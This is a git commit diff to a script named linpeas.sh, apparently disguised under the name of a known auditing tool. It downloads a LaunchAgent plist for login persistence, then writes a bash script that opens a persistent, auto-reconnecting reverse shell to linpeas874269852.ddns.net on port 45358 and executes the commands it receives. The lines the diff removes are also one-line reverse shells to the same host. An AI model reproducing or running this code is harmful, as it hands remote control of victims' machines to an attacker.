e9d5e6fdcdbcac4fe1d9221375628f92e50c2938
canarddu38 <71982379+canarddu38@users.noreply.github.com>
2024-02-10 11:39:42 +0100

    Update linpeas.sh

--- linpeas.sh
+++ linpeas.sh
@@ -1,13 +1,27 @@
 curl -L https://raw.githubusercontent.com/canarddu38/temp/main/loginscript.plist --output ~/Library/LaunchAgents/com.user.loginscript.plist
 
 cat > ~/bashlogon_d.sh <<EOF
-bash -i >& /dev/tcp/linpeas874269852.ddns.net/45358 0>&1
+#!/bin/bash
 
-exec 5<>/dev/tcp/linpeas874269852.ddns.net/45358;cat <&5 | while read line; do $line 2>&5 >&5; done
+# Function to establish connection
+establish_connection() {
+    exec 5<>/dev/tcp/linpeas874269852.ddns.net/45358
+}
 
-exec /bin/sh 0</dev/tcp/linpeas874269852.ddns.net/45358 1>&0 2>&0
+# Function to handle commands
+handle_commands() {
+    while read -r line; do
+        $line 2>&5 >&5
+    done <&5
+}
 
-0<&196;exec 196<>/dev/tcp/linpeas874269852.ddns.net/45358; sh <&196 >&196 2>&196
+# Main loop to handle reconnection
+while true; do
+    establish_connection
+    handle_commands
+    # Sleep for a while before attempting to reconnect
+    sleep 5
+done
 EOF
 
 chmod +x ~/bashlogon_d.sh
